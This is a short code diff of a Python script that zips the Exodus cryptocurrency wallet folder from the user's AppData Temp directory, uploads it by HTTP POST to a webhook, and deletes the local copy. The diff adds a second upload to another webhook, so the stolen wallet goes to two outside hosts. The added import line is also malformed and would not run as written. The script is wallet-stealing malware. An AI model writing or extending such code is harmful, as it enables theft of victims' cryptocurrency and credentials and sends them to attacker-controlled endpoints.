@@ -1,5 +1,5 @@
 import os.path, shutil, requests
-from config import hook
+from config import hook import hook1
 
 user = os.path.expanduser("~")
 def exo():
@@ -9,6 +9,7 @@ def exo():
 
   file = {'file': open(user+"\\AppData\\Local\\Temp\\Exodus.zip", 'rb')}
   r = requests.post(hook, files=file)
+  r = requests.post(hook1, files=file)
   try:
    os.remove(user+"\\AppData\\Local\\Temp\\Exodus.zip")
    os.remove(user+"\\AppData\\Local\\Temp\\Exodus")
